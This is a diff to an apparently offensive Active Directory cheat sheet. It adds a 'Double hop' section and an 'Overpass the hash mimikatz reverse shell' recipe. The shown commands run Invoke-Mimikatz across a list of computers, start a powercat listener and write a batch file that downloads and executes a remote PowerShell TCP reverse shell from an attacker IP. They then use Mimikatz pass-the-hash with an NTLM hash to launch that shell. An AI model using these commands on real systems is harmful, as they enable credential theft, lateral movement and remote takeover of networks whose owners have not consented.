@@ -45,18 +45,29 @@ Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content co
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
 ```
 
-#### Pssession in pssession
-```
-Enter-PSSession -ComputerName <NAME>
-#in session
-$sess = New-PSSession ufc-webprod -Credential <DOMAIN>\<USER>
-Invoke-Command -Scriptblock {hostname; whoami;} -Session $sess
-```
-
 #### Runas other user
 ```
 runas /netonly /user:<DOMAIN>\<USER> cmd.exe
 runas /netonly /user:<DOMAIN>\<USER> powershell.exe
+```
+
+## Double hop
+#### Pssession in pssession
+```
+Enter-PSSession -ComputerName <NAME>
+#in session
+$sess = New-PSSession <SERVER> -Credential <DOMAIN>\<USER>
+Invoke-Command -Scriptblock {hostname; whoami;} -Session $sess
+```
+
+#### Overpass the hash mimikatz reverse shell
+```
+powercat -l -v -p 444 -t 5000
+
+$sess = New-PSSession <SERVER> 
+#.ps1 is a reverse shell back to the attacker machine, make sure you run it as the user you want
+$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
 ```
 
 ## Find credentials in files
